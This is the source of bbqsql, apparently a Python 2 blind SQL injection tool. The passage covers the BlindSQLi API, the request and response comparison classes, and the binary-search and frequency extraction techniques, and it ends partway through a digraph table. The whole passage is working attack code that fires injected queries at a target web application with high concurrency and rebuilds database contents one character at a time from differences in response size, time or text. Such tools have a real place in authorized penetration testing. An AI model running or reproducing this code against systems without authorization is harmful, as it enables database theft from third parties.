__FILENAME__ = api
from .query import Query
from .pretty_print import PrettyTable
from .technique import *
from .requester import *

from bbqsql import utilities
from bbqsql import settings

from urllib import quote
from traceback import print_exc
import re

__all__ = ['Query','BlindSQLi']

techniques = {'binary_search':BooleanBlindTechnique,'frequency_search':FrequencyTechnique}


#mappings from response attributes to Requester subclasses
response_attributes = {\
    'status_code':Requester,\
    'url':Requester,\
    'time':LooseNumericRequester,\
    'size':LooseNumericRequester,\
    'text':LooseTextRequester,\
    'content':LooseTextRequester,\
    'encoding':LooseTextRequester,\
    'cookies':LooseTextRequester,\
    'headers':LooseTextRequester,\
    'history':LooseTextRequester
}

class BlindSQLi:
    '''
    This object allows you to do a blind sql injection attack. 
    '''
    def __init__(self,\
        query               = "row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}",\
        comparison_attr     = "size",
        technique           = "binary_search",\
        concurrency         = 50,**kwargs):
        '''
        Initialize the BlindSQLi with query, comparison_attr, technique, and any Requests
        parameters you would like (url,method,headers,cookies). For more details on these,
        check out the documentation for the Requests library at https://github.com/kennethreitz/requests .

            :param query      
                This should be a bbqsql.Query object that specified arguments such as 
                row_index, char_index, character_value, comparator, sleep and so on. 
                Every time a request is made, this Query gets rendered and put into 
                the request. You can specify where it gets put into the request by
                making one or more of the request parameters a Query object with 
                an argument called "injection". For example, if the SQL injection
                is in the query string of a HTTP GET request, you might set the following:

                url     = bbqsql.Query('http://127.0.0.1:8090/error?${injection}')
                query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}\\
                          &character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}",encoder=quote)
                bsqli   = bbqsql.BlindSQLi(query=query,url=url)
            
            :param comparison_attribute
                This specifies what part of the HTTP response we are looking at to determing
                if your request was evaluated as true or as false. This can be any of the
                following response attributes:
                    -status_code
                    -url
                    -time
                    -size
                    -text
                    -content
                    -encoding
                    -cookies
                    -headers
                    -history
            
            :param technique 
                This specifies what method we will use for doing the blind SQLi. The available options
                are 'binary_search' and 'frequency_search'.

            :param concurrency
                This is the number of eventlets (evented threads) to use for our requests. This will
                rate limit our attack and prevent us from DOSing the server. This should be set close
                to the number of worker threads on the server.

            :param method:          method for the new :class:`Request` object.
            :param url:             URL for the new :class:`Request` object.
            :param params:          (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`.
            :param data:            (optional) Dictionary or bytes to send in the body of the :class:`Request`.
            :param headers:         (optional) Dictionary of HTTP Headers to send with the :class:`Request`.
            :param cookies:         (optional) Dict or CookieJar object to send with the :class:`Request`.
            :param files:           (optional) Dictionary of 'name': file-like-objects (or {'name': ('filename', fileobj)}) for multipart encoding upload.
            :param auth:            (optional) Auth tuple to enable Basic/Digest/Custom HTTP Auth.
            :param allow_redirects: (optional) Boolean. Set to True if POST/PUT/DELETE redirect following is allowed.
            :param proxies:         (optional) Dictionary mapping protocol to the URL of the proxy.
            :param verify:          (optional) if ``True``, the SSL cert will be verified. A CA_BUNDLE path can also be provided.
        '''

        self.concurrency = concurrency
        self.error = False

        try:
            self.technique_type = techniques[technique]
        except KeyError:
            raise Exception("You are trying to use the %s technique, which is not a valid technique. Your options are %s" % (technique,repr(techniques.keys())))

        try:
            requester_type = response_attributes[comparison_attr]
        except KeyError:
            print "You tried to use a comparison_attr that isn't supported. Check the docs for a list"
            quit()

        # convert query string to Query
        self.query = Query(query)

        # Convert a string or dict to Query if it matches the necessary syntax.
        for key in kwargs:
            if type(kwargs[key]) == str and re.match(u'.*\$\{.+\}.*',kwargs[key]):
                kwargs[key] = Query(kwargs[key],encoder=quote)
            
            elif type(kwargs[key]) == dict:
                for k in kwargs[key]:
                    if type(k) == str and re.match(u'\$\{.+\}',k):
                        kwargs[key][Query(k,encoder=quote)] = kwargs[key][k]
                        del(kwargs[key][k])
                    if type(kwargs[key][k]) == str and re.match(u'\$\{.+\}',kwargs[key][k]):
                        kwargs[key][k] = Quote(kwargs[key][k],encoder=quote)

        #build a Requester object. You can pass this any args that you would pass to requests.Request
        self.requester = requester_type(comparison_attr=comparison_attr, **kwargs)

        #the queries default options should evaluate to True in whatever application we are testing. If we flip the comparator it should evauluate to false. 
        #here, we figure out what the opposite comparator is.
        opp_cmp = settings.OPPOSITE_COMPARATORS[self.query.get_option('comparator')]

        #set all the indicies back to 0
        self.query.set_option('char_index','1')
        self.query.set_option('row_index','0')

        print "\n"*100
        try:
            #setup some base values
            #true
            for i in xrange(settings.TRUTH_BASE_REQUESTS):
                self.requester.make_request(value=self.query.render(),case='true',rval=True,debug=(i==settings.TRUTH_BASE_REQUESTS-1))

            #false
            self.query.set_option('comparator',opp_cmp)
            for i in xrange(settings.TRUTH_BASE_REQUESTS):
                self.requester.make_request(value=self.query.render(),case='false',rval=False,debug=(i==settings.TRUTH_BASE_REQUESTS-1))
        except utilities.TrueFalseRangeOverlap:
            self.error = "The response values for true and false are overlapping. Check your configuration.\n"
            self.error += "here are the cases we have collected:\n"
            self.error += str(self.requester.cases)
            
        '''
        #error
        self.query.set_option('char_index','1000')
        for i in xrange(settings.TRUTH_BASE_REQUESTS):
            self.requester.make_request(value=self.query.render(),case='error',rval=False,debug=(i==settings.TRUTH_BASE_REQUESTS-1))
        '''

    @utilities.debug 
    def run(self):
        '''
        Run the BlindSQLi attack, returning the retreived results.
        '''
        
        # DEBUGGING
        print "lib.api.BlindSQLi.run"

        try:
            #build our technique
            if not settings.QUIET and not settings.PRETTY_PRINT: print "setting up technique"
            tech = self.technique_type(requester=self.requester,query=self.query)
            
            if settings.PRETTY_PRINT and not settings.QUIET:
                #setup a PrettyTable for curses like printing
                pretty_table = PrettyTable(get_table_callback=tech.get_results,get_status_callback=tech.get_status,update=settings.PRETTY_PRINT_FREQUENCY)
            
            #run our technique
            if not settings.QUIET and not settings.PRETTY_PRINT: print "starting technique"
            techgl = tech.run(concurrency=self.concurrency,row_len=5)

            if settings.PRETTY_PRINT and not settings.QUIET:
                #start printing the tables
                pretty_table.start()

            #wait for the technique to finish
            techgl.join()

            if not settings.QUIET and not settings.PRETTY_PRINT: print "technique finished"

            if settings.PRETTY_PRINT and not settings.QUIET:
                #kill the pretty tables
                pretty_table.die()
            
            results = tech.get_results()

            if not settings.QUIET and not settings.PRETTY_PRINT:
                print results

            return results

        except KeyboardInterrupt:            
            print "stopping attack"
            # going to try to retreive the partial results. this could go badly
            results = tech.get_results()
            return results

########NEW FILE########
__FILENAME__ = pretty_print
# file: pretty_print.py

from bbqsql import utilities

import sys
import re
import gevent
from gevent.event import Event
from subprocess import Popen,PIPE,STDOUT

@utilities.debug 
def len_less_color(line):
	'''return the length of a string with the color characters stripped out'''
	return len(re.sub(u'\033\[[0-9]+m','',line))

class PrettyTable:
	def __init__(self,get_table_callback=None,get_status_callback=None,update=.2,row_filter=None):
		self.update = update

		#function to call to get new tables
		self.get_table_callback = get_table_callback

		#function to call to get technique status
		self.get_status_callback = get_status_callback

		# find the terminal size
		self._find_screen_size()

		self.row_filter = row_filter

	@utilities.debug 
	def start(self):
		self._printer_glet = gevent.spawn(self._table_printer)

	@utilities.debug 
	def die(self):
		self._printer_glet.kill()

	def _find_screen_size(self):
		if self._is_linux():
			self.sizey,self.sizex = Popen(['stty','size'],stdout=PIPE,stderr=STDOUT,stdin=None).stdout.read().replace('\n','').split(' ')
			self.sizex = int(self.sizex)
			self.sizey = int(self.sizey)
		else:
			self.sizey,self.sizex = 40,150

	def _is_linux(self):
		return 'linux' in sys.platform or 'darwin' in sys.platform
	
	def _table_printer(self):
		'''
		pretty prints a 1-d list.
		'''

		i = 0
		while True:
			table = self.get_table_callback(color=True)
			#table = self.get_table_callback()

			# keep it short
			if len(table)>100: table = table[-100:]

			table = filter(self.row_filter,table)

			#figure out how many new lines are needed to be printed before the table data
			tlen = len(table)
			new_lines_needed = self.sizey - tlen - reduce(lambda x,row: x + len_less_color(row) // self.sizex,table,0) - 3

			#start building out table,
			str_table = "\n"
			str_table += "\n".join(table)
			str_table += "\n"*new_lines_needed

			if self.get_status_callback:
				str_table += "\n" + str(self.get_status_callback())
			
			str_table += "\n"
			
			sys.stdout.write(str_table)

			# sleep for a bit
			gevent.sleep(self.update)
########NEW FILE########
__FILENAME__ = query
# file: query.py
from bbqsql import utilities

class Query(object):
    '''
    A query is a string that can be rendered (think prinf). 
    query syntax is "SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}". 
    Anything inside ${} will be settable and will be rendered based on value set. For example: 
    
    >>> q = bbqsql.Query("hello ${x:world}")
    >>> print q.render()
    hello world
    >>> q.set_option('x','Ben')
    >>> print q.render()
    hello Ben
    '''
    def __init__(self,q_string,options=None,encoder=None):
        '''
        q_string syntax is "SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}". 
        The options are specified in ${}, with the value before the ':' being the option name
        and the value after the ':' being the default value. 

        There is an optional options parameter that allows you to set the option values manually rather than
        having them be parsed.
        '''
        self.encoder = encoder
        self.q_string = q_string
        if options:
            self.options = options
        else:
            self.options = self.parse_query(q_string)
    
    @utilities.debug 
    def get_option(self,ident):
        '''
        Get the option value whose name is 'ident'
        '''
        return self.options.get(ident,False)
    
    @utilities.debug 
    def set_option(self,ident,val):
        '''
        Set the value of the option whose name is 'ident' to val
        '''
        if self.has_option(ident):self.options[ident] = val
    
    @utilities.debug 
    def has_option(self,option):
        return option in self.options

    @utilities.debug 
    def get_options(self):
        '''
        Get all of the options (in a dict) for the query
        '''
        return self.options
    
    @utilities.debug 
    def set_options(self,options):
        '''
        Set the queries option (dict).
        '''
        self.options = options
    
    @utilities.debug 
    def parse_query(self,q):
        '''
        This is mostly an internal method, but I didn't want to make it private.
        This takes a query string and returns a options dict.
        '''
        options = {}
        section = q.split("${")
        if len(section) > 1:
            for section in section[1:]:
                inside = section.split("}")[0].split(":")
                ident = inside[0]
                if len(inside) > 1:
                    default = inside[1]
                else:
                    default = ""
                options[ident] = default
        return options
    
    @utilities.debug 
    def render(self):
        '''
        This compiles the queries options and the original query string into a string.
        See the class documentation for an example.
        '''
        section = self.q_string.split("${")
        output = section[0]
        if len(section) > 1:
            for section in section[1:]:
                split = section.split('}')
                left = split[0]
                #in case there happens to be a rogue } in our query
                right = '}'.join(split[1:])
                ident = left.split(':')[0]
                val = self.options[ident]
                if self.encoder != None:
                    val = self.encoder(val)
                output += val
                output += right
        return output
    
    def __repr__(self):
        return self.q_string
    
    def __str__(self):
        return self.__repr__()
########NEW FILE########
__FILENAME__ = requester
from .query import Query

from bbqsql import utilities
from bbqsql import settings

import requests
import gevent 

from math import sqrt
from copy import copy
from time import time
from difflib import SequenceMatcher

__all__ = ['Requester','LooseNumericRequester','LooseTextRequester']

@utilities.debug 
def requests_pre_hook(request):
    #hooks for the requests module to add some attributes
    request.start_time = time()
    return request

@utilities.debug 
def requests_response_hook(response):
    #hooks for the requests module to add some attributes
    response.time = time() - response.request.start_time
    if hasattr(response.content,'__len__'): 
        response.size = len(response.content)
    else: 
        response.size = 0
    return response

class EasyMath():
    def mean(self,number_list):
        if len(number_list) == 0:
            return float('nan')

        floatNums = [float(x) for x in number_list]
        means = sum(floatNums) / len(number_list)
        return means

    def stdv(self,number_list,means):
        size = len(number_list)
        std = sqrt(sum((x-means)**2 for x in number_list) / size)
        return std

class Requester(object):
    '''
    This is the base requester. Initialize it with request parameters (url,method,cookies,data) and a 
    comparison_attribute (size,text,time) which is used for comparing multiple requests. One of the 
    request parameters should be a Query object. Call the make_request function with a value. That value
    will be compiled/rendered into the query object in the request, the request will be sent, and the response
    will be analyzed to see if the query evaluated as true or not. This base class compares strictly (if we are looking
    at size, sizes between requests must be identical for them to be seen as the same). Override _test to change this
    behavior.
    '''

    def __init__( self,comparison_attr = "size" , acceptable_deviation = .6, *args,**kwargs):
        '''
        :comparison_attr        - the attribute of the objects we are lookig at that will be used for determiniing truth
        :acceptable_deviation   - the extent to which we can deviate from absolute truth while still being consider true. The meaning of this will varry depending on what methods we are using for testing truth. it has no meaning in the Truth class, but it does in LooseTextTruth and LooseNumericTruth
        '''
        #Truth related stuff
        self.cases = {}

        self.comparison_attr = comparison_attr
        self.acceptable_deviation = acceptable_deviation

        # make sure the hooks are lists, not just methods
        kwargs.setdefault('hooks',{})

        for key in ['pre_request','response']:
            kwargs['hooks'].setdefault(key,[])

            if hasattr(kwargs['hooks'][key],'__call__'):
                kwargs['hooks'][key] = [kwargs['hooks'][key]]

        kwargs['hooks']['pre_request'].append(requests_pre_hook)

        kwargs['hooks']['response'].append(requests_response_hook)

        #
        # moving things to a session for performance (reduce dns lookups)
        #

        self.request_kwargs = {}

        #pull out any other Query objects
        self.query_objects = {}
        for elt in [q for q in kwargs if isinstance(kwargs[q],Query)]:
            self.request_kwargs[elt] = kwargs[elt]
            del(kwargs[elt])

        # pull out the url, method and data
        if 'method' in kwargs:
            self.request_kwargs['method'] = kwargs['method']
            del(kwargs['method'])
        if 'url' in kwargs:
            self.request_kwargs['url'] = kwargs['url']
            del(kwargs['url'])
        if 'data' in kwargs:
            self.request_kwargs['data'] = kwargs['data']
            del(kwargs['data'])

        # all the same prep stuff that grequests.patched does
        # self.request_kwargs['return_response'] = False
        self.request_kwargs['prefetch'] = True

        config = kwargs.get('config', {})
        config.update(safe_mode=True)

        kwargs['config'] = config

        self.session = requests.session(*args,**kwargs)
    
    @utilities.debug 
    def make_request(self,value="",case=None,rval=None,debug=False):
        '''
        Make a request. The value specified will be compiled/rendered into all Query objects in the
        request. If case and rval are specified the response will be appended to the list of values 
        for the specified case. if return_case is True then we return the case rather than the rval.
        this is only really used for recursing by _test in the case of an error. Depth keeps track of 
        recursion depth when we make multiple requests after a failure. 
        '''

        new_request_kwargs = copy(self.request_kwargs)

        # keep track of which keys were dynamic so we know which ones to print after we make the request.
        # we do this so hooks can process the requests before we print them for debugging...
        keys_to_debug = []

        #iterate over the request_kwargs and compile any elements that are query objects.
        for k in [e for e in new_request_kwargs if isinstance(new_request_kwargs[e],Query)]:
            opts = new_request_kwargs[k].get_options()
            for opt in opts:
                opts[opt] = value
            new_request_kwargs[k].set_options(opts)
            new_request_kwargs[k] = new_request_kwargs[k].render()

            keys_to_debug.append(k)

        response = self.session.request(**new_request_kwargs)

        if debug:
            for k in keys_to_debug:
                print "Injecting into '%s' parameter" % k
                print "It looks like this: %s" % getattr(response.request,k)

        #glet = grequests.send(new_request)
        #glet.join()
        #if not glet.get() and type(new_request.response.error) is requests.exceptions.ConnectionError:
        #    raise utilities.SendRequestFailed("looks like you have a problem")

        #see if the response was 'true'
        if case is None:
            case = self._test(response)
            rval = self.cases[case]['rval']

        if debug and case:
            print "we will be treating this as a '%s' response" % case
            print "for the sample requests, the response's '%s' were the following :\n\t%s" % (self.comparison_attr,self.cases[case]['values'])
            print "\n"


        self._process_response(case,rval,response)

        return self.cases[case]['rval']

    @utilities.debug 
    def _process_response(self,case,rval,response):
        self.cases.setdefault(case,{'values':[],'rval':rval})

        #get the value from the response
        value = getattr(response,self.comparison_attr)

        #store value
        self.cases[case]['values'].append(value)

        #garbage collection
        if len(self.cases[case]['values']) > 10:
            del(self.cases[case]['values'][0])      

    def _test(self,response):
        '''test if a value is true'''
        value = getattr(response,self.comparison_attr)
        for case in self.cases:
            if value in self.cases[case]['values']:
                return case

class LooseNumericRequester(Requester):
    def _process_response(self,case,rval,response):
        self.cases.setdefault(case,{'values':[],'rval':rval,'case':case})

        #get the value from the response
        value = getattr(response,self.comparison_attr)

        #store value
        self.cases[case]['values'].append(value)

        #garbage collection
        if len(self.cases[case]['values']) > 10:
            del(self.cases[case]['values'][0])

        #statistics :D
        math = EasyMath()
        m = math.mean(self.cases[case]['values'])
        s = math.stdv(self.cases[case]['values'], m)

        self.cases[case]['mean'] = m
        self.cases[case]['stddev'] = s

        self._check_for_overlaps()

    def _check_for_overlaps(self):
        '''make sure that cases with different rvals aren't overlapping'''
        for outer in self.cases:
            for inner in self.cases:
                #if the return vals are the same, it doesn't really matter if they blend together.
                if self.cases[inner]['rval'] != self.cases[outer]['rval']:
                    math = EasyMath()
                    mean_stddev = math.mean([self.cases[inner]['stddev'],self.cases[outer]['stddev']])
                    diff = abs(self.cases[inner]['mean'] - self.cases[outer]['mean'])
                    if diff <= mean_stddev*2: 
                        raise utilities.TrueFalseRangeOverlap("truth and falsity overlap")

    def _test(self,response):
        '''test a value'''
        #make an ordered list of cases
        ordered_cases = []
        for case in self.cases:
            if len(ordered_cases) == 0:
                ordered_cases.append(self.cases[case])
            else:
                broke = False
                for index in xrange(len(ordered_cases)):
                    if self.cases[case]['mean'] <= ordered_cases[index]['mean']:
                        ordered_cases.insert(index,self.cases[case])
                        broke = True
                        break
                if not broke:
                    ordered_cases.append(self.cases[case])

        value = getattr(response,self.comparison_attr)

        #figure out which case best fits our value
        for index in xrange(len(ordered_cases)):
            lower_avg = None
            upper_avg = None
            math = EasyMath()
            if index != 0:
                lower_avg = math.mean([ordered_cases[index-1]['mean'],ordered_cases[index]['mean']])

            if index != len(ordered_cases) - 1:
                upper_avg = math.mean([ordered_cases[index]['mean'],ordered_cases[index+1]['mean']])

            if not lower_avg and value <= upper_avg:
                return ordered_cases[index]['case']

            elif not upper_avg and value >= lower_avg:
                return ordered_cases[index]['case']

            elif value >= lower_avg and value <= upper_avg:
                return ordered_cases[index]['case']

        #should never get here
        raise Exception('this is shit hitting the fan')


class LooseTextRequester(Requester):
    def _test(self,response):
        value = getattr(response,self.comparison_attr)

        max_ratio = (0,None)
        for case in self.cases:
            for case_value in self.cases[case]['values']:
                ratio = SequenceMatcher(a=str(value),b=str(case_value)).quick_ratio()
                if ratio > max_ratio[0]:
                    max_ratio = (ratio,case)

        return max_ratio[1]

########NEW FILE########
__FILENAME__ = technique
#file: technique.py

from bbqsql import settings
from bbqsql import utilities

import gevent
from gevent.event import AsyncResult,Event
from gevent.coros import Semaphore
from gevent.queue import Queue
from gevent.pool import Pool

from time import time
from copy import copy

__all__ = ['BooleanBlindTechnique','FrequencyTechnique']


#########################
# Binary Search Technique
#########################

class BlindCharacter(object):
    def __init__(self,row_index,char_index,queue,row_die):
        '''
            :row_index  - what row this character is a part of (for rendering our Query)
            :char_index - what character in the row is this (for rendering our Query)
            :queue      - what queue will we push to. this queue will receive tuples in the
                          form of:
                             item=(self.row_index,self.char_index,self.char_val,comparator,asr)
            :row_die    - gevent.event.AsyncResult that gets fired when the row needs to die. the
                          value passed to this ASR's set() should be the char_index in this row
                          after which all Character()s need to kill themselves
        '''
        #row_die is an AsyncResult. We link our die method to and store the 
        #event so the die method can know if it should die (based on char_index emmitted by row_die)
        self.row_die = row_die
        self.row_die.rawlink(self._die_callback)
        #run_gl will store the greenlet running the run() method
        self.run_gl = None
        self.q = queue

        self.row_index = row_index
        self.char_index = char_index
        self.char_val = settings.CHARSET[0]

        #these flags are used in computing the __str__, __repr__, and __eq__
        self.error = False
        self.working = False
        self.done = False
    
    @utilities.debug 
    def run(self):
        #make note of the current greenlet
        self.run_gl = gevent.getcurrent()

        low = 0
        high = settings.CHARSET_LEN
        self.working = True        
        #binary search unless we hit an error
        while not self.error and self.working:
            mid = (low+high)//2
            self.char_val = settings.CHARSET[mid]

            if low >= high:
                self.error = True
                self.row_die.set((self.char_index,AsyncResult()))
                break

            if self._test("<"):
                #print "data[%d][%d] > %s (%d)" % (self.row_index,self.char_index,settings.CHARSET[mid],ord(settings.CHARSET[mid]))
                high = mid
            elif self._test(">"):
                #print "data[%d][%d] < %s (%d)" % (self.row_index,self.char_index,settings.CHARSET[mid],ord(settings.CHARSET[mid]))
                low = mid + 1
            elif low < settings.CHARSET_LEN and self._test("="):
                #print "data[%d][%d] = %s (%d)" % (self.row_index,self.char_index,settings.CHARSET[mid],ord(settings.CHARSET[mid]))
                self.working = False
                break
            else:
                #if there isn't a value for the character we are working on, that means we went past the end of the row.
                #we set error and kill characters after us in the row.
                self.error = True
                self.row_die.set((self.char_index,AsyncResult()))
                break

            gevent.sleep(0)
            
        self.done = True
        self.working = False

        #clear the note regarding the running greenlet
        self.run_gl = None
    
    @utilities.debug 
    def get_status(self):
        if self.error: return "error"
        if self.working: return "working"
        if self.done: return "success"
        return "unknown"
    
    def _die_callback(self,event):
        #we do the next_event because the first event might be first for the last character. 
        #this way we can fire the die event multiple times if necessary
        die_index,next_event = self.row_die.get()
        if die_index  < self.char_index and self.run_gl:
            self.run_gl.kill(block=False)
            self.error = True
            self.done = True
            self.working = False
        else:
            self.row_die = next_event
            self.row_die.rawlink(self._die_callback)
    
    def _test(self,comparator):
        asr = AsyncResult()
        self.q.put(item=(self.row_index,self.char_index,self.char_val,comparator,asr))
        res = asr.get()
        return res

    def __eq__(self,y):
        if y == "error":
            return self.error
            
        if y == "working":
            return self.working and (not self.error)
        
        if y == "success":
            return self.done and (not self.error)
        
        if y.hasattr('char_val'):
            return self.char_val == y.char_val
        
        return self.char_val == y
        
    def __ne__(self,y):
        return not self.__eq__(y)

    def __str__(self):
        # if error or not started yet return ''
        if self.error or (not self.working and not self.done): return ""
        # else return char_val
        return self.char_val

    def __repr__(self):
        # if error or not started yet return ''
        if self.error or (not self.working and not self.done): return ""
        # else return char_val
        return self.char_val
    
    def __hash__(self):
        # objects that override __eq__ cannot be hashed (cannot be added to a lot of structures like set()....). 
        return id(self)


class BooleanBlindTechnique:
    def __init__(self, query, requester):
        self.query = query
        self.requester = requester
        self.rungl = None

    def _reset(self):
        '''
        reset all the variables used for keeping track of internal state
        '''
        #an list of Character()s 
        self.results = []
        #an list of strings
        self.str_results = []
        #character generators take care of building the Character objects. we need one per row
        self.char_gens = []
        #a queue for communications between Character()s and request_makers
        self.q = Queue()
        #"threads" that run the Character()s
        self.character_pool = Pool(self.concurrency)
        #"threads" that make requests
        self.request_makers = [gevent.spawn(self._request_maker) for i in range(self.concurrency)]
        #fire this event when shutting down
        self.shutting_down = Event()
        #do we need to add more rows?
        self.need_more_rows = True
        #use this as a lock to know when not to mess with self.results        
        self.results_lock = Semaphore(1)
        #request_count is the number of requests made on the current run
        self.request_count = 0
        #failure_count is the number of requests made on the current run
        self.failure_count = 0

    def _request_maker(self):
        '''
        this runs in a gevent "thread". It is a worker
        '''
        #keep going until we shut down the technique
        while not self.shutting_down.is_set():
            #pull the info needed to make a request from the queue
            row_index,char_index,char_val,comparator,char_asyncresult = self.q.get()

            #build out our query object
            query = copy(self.query)
            query.set_option('row_index',str(row_index))
            query.set_option('char_index',str(char_index))
            query.set_option('char_val',str(ord(char_val)))
            query.set_option('comparator',comparator)
            query_string = query.render()

            self.request_count += 1

            count = 0
            response = None
            while response == None:
                try:
                    response = self.requester.make_request(query_string)
                except utilities.SendRequestFailed:
                    self.failure_count += 1
                    response = None
                    gevent.sleep(.01 * 2 ** count)                    
                    if count == 10: raise SendRequestFailed('cant request')
                count += 1

            char_asyncresult.set(response)

    def _character_generator(self,row_index):
        '''
        creates a Character object for us. this generator is useful just because it keeps track of the char_index
        '''
        char_index = 1
        row_die_event = AsyncResult()
        while not self.shutting_down.is_set():
            c = BlindCharacter(\
                row_index   = row_index,\
                char_index  = char_index,\
                queue       = self.q,\
                row_die     = row_die_event)
            char_index += 1
            #fire off the Character within our Pool.
            self.character_pool.spawn(c.run)
            yield c

    def _adjust_row_lengths(self):
        ''' 
        if a row is full of "success", but we havent reached the end yet (the last elt isnt "error")
        then we need to increase the row_len.
        '''
        while not self.shutting_down.is_set():
            self.results_lock.acquire()

            if self.row_len is not None:
                unused_threads = self.concurrency - reduce(lambda x,row: x + row.count('working'),self.results,0)
                rows_working = len(filter(lambda row: 'working' in row,self.results))
                if rows_working == 0:
                    add_to_rows = self.row_len
                else:
                    add_to_rows = unused_threads//rows_working
                    add_to_rows = [add_to_rows,1][add_to_rows==0]
            else:
                add_to_rows = 1

            for row_index in range(len(self.results)):
                #if the row isn't finished or hasn't been started yet, we add Character()s to the row
                if 'error' not in self.results[row_index]:
                    self.results[row_index] += [self.char_gens[row_index].next() for i in range(add_to_rows)]
            self.results_lock.release()
            gevent.sleep(.3)

    def _add_rows(self):
        '''
        look at how many gevent "threads" are being used and add more rows to correct this
        '''

        # if they don't specify row_index we assume only one row
        if not self.query.has_option("row_index"):
            self.char_gens.append(self._character_generator(0))
            self.results.append([])
            self.need_more_rows = False
            return True

        # figure out how many rows at a time we should start working on
        if self.row_len is not None:
            rows_to_work_on = self.concurrency // self.row_len
        else:
            rows_to_work_on = self.concurrency
        rows_to_work_on = [rows_to_work_on,1][rows_to_work_on == 0]

        row_index = 0

        # keep adding new rows until we dont need any more
        while self.need_more_rows:
            working_rows = len(filter(lambda row: 'working' in row,self.results))
            for row in range(rows_to_work_on - working_rows):
                self.char_gens.append(self._character_generator(row_index))
                self.results.append([])
                row_index += 1

            gevent.sleep(.3)
            self.need_more_rows = not(len(self.results) and filter(lambda row: len(row) and row[0] == 'error',self.results))
        
        # delete any extra rows.
        while not self.shutting_down.is_set():
            self.results_lock.acquire()
            # delete any rows that shouldn't have been added in the first place
            errored = filter(lambda ri: len(self.results[ri]) and self.results[ri][0] == 'error',range(len(self.results)))
            if errored:
                end = min(errored)
                for ri in xrange(len(self.results)-1,end-1,-1):
                    del(self.results[ri])

            self.results_lock.release()    
            #if there aren't going to be any more rows in need of deletion we can stop this nonsense
            if self.results and self.results[-1][0] == 'success':
                break
            gevent.sleep(.3)

    def _keep_going(self):
        '''
        Look at the results gathered so far and determine if we should keep going. we want to keep going until we have an empty row
        '''
        # chill out until we don't need any more rows
        while self.need_more_rows:
            gevent.sleep(1)

        # chill out untill all the rows have finished working
        while filter(lambda row:'error' not in row or 'working' in row[:row.index('error')],self.results):
            gevent.sleep(.5)
        
        # call it quits
        self.shutting_down.set()

    def _run(self):
        self.kg_gl = gevent.spawn(self._keep_going)
        self.ar_gl = gevent.spawn(self._add_rows)
        self.arl_gl = gevent.spawn(self._adjust_row_lengths)

        self.kg_gl.join()
        self.ar_gl.join()
        self.arl_gl.join()
    
        self.character_pool.join()
        gevent.killall(self.request_makers)
        gevent.joinall(self.request_makers)

    @utilities.debug 
    def run(self,row_len=None,concurrency=20):
        '''
        run the exploit. returns the data retreived.
            :concurrency    how many gevent "threads" to use. This is useful for throttling the attack.
            :row_len        An estimated starting point for the length of rows. This will get adjusted as the attack goes on.
        '''
        self.run_start_time = time()

        self.row_len = row_len
        self.concurrency = concurrency

        #start fresh
        self._reset()

        self.rungl = gevent.spawn(self._run)
        
        return self.rungl

    @utilities.debug 
    def get_results(self,color=False):
        if not color:
            return filter(lambda row: row != '',[''.join([str(x) for x in row]) for row in self.results])
        
        rval = []
        running_status = "unknown"

        for row in self.results:
            if len(row):
                    running_status = "unknown"
                    row_string = ""
                    for c in row:
                        cstatus = c.get_status()
                        if cstatus != running_status:
                            row_string += settings.COLORS[cstatus]
                            running_status = cstatus
                        row_string += str(c)
                    rval.append(row_string + settings.COLORS['endc'])
        return rval
            

        #return filter(lambda row: row != '',[''.join([settings.COLORS[x.get_status()] + str(x) + settings.COLORS['endc'] for x in row]) for row in self.results])        

    @utilities.debug 
    def get_status(self):
        status = ""
        status += "requests: %d\t" % self.request_count
        status += "failures: %d\t" % self.failure_count
        status += "rows: %d\t" % reduce(lambda x,row: ('success' in row)+x,self.results,0)
        status += "working threads: %d\t" %  reduce(lambda x,row: x + row.count('working'),self.results,0)
        
        chars = reduce(lambda x,row: row.count('success') + x,self.results,0)
        status += "chars: %d\t" % chars

        if self.run_start_time:
            run_time = time() - self.run_start_time
            status += "time: %f\t" % run_time
            status += "char/sec: %f\t" % (chars/run_time)

        if chars: rc = float(self.request_count) / chars
        else: rc = 0.0
        status += "req/char: %f\t" % rc

        return status


###########################
# Frequency Based Technique
###########################

diagraphs_english = {'\n': ['t', 's', 'a', 'h', 'w', '\n', 'c', 'b', 'f', 'o', 'i', 'm', 'p', 'd', '"', 'l', 'r', 'e', 'n', 'g', 'T', 'y', 'u', 'M', 'S', 'I', 'A', 'v', 'H', 'k', 'B', 'E', 'W', '&', 'P', 'q', 'C', 'j', 'F', 'D', 'G', 'L', 'R', "'", 'J', 'O', 'N', 'Y', 'K', 'V', ' ', '(', 'U', ',', '.', 'Z', '-', 'Q', '_', ';', '1', '2', '!', '3', '4', '6', '?', '[', '\t', '\r', '#', '$', '%', ')', '*', '+', '/', '0', '5', '7', '8', '9', ':', '<', '=', '>', '@', 'X', '\\', ']', '^', '`', 'x', 'z', '{', '|', '}', '~'], '!': [' ', '&', '"', "'", '\n', '-', ')', 'A', 'H', 'T', 'B', 'I', 'S', 'W', ',', 'D', 'O', 'R', '_', '!', '>', 'F', 'N', 'P', 'U', 'V', 'Y', '\t', '\r', '#', '$', '%', '(', '*', '+', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '?', '@', 'C', 'E', 'G', 'J', 'K', 'L', 'M', 'Q', 'X', 'Z', '[', '\\', ']', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ' ': ['t', 'a', 'h', 's', 'w', 'o', 'i', 'b', 'm', 'f', 'c', 'l', 'd', 'p', 'n', 'y', 'I', 'r', 'g', 'e', 'T', 'M', 'u', ' ', 'S', 'A', '-', 'k', 'H', 'v', 'B', '&', 'W', 'L', 'q', 'P', 'j', 'E', 'D', 'J', 'G', "'", 'C', '"', 'R', 'Y', 'O', 'N', 'F', 'K', 'V', '(', '_', 'U', '.', '\n', 'Z', '1', 'Q', 'z', '4', '3', '2', '7', '!', '5', '8', '6', '?', '\t', '\r', '#', '$', '%', ')', '*', '+', ',', '/', '0', 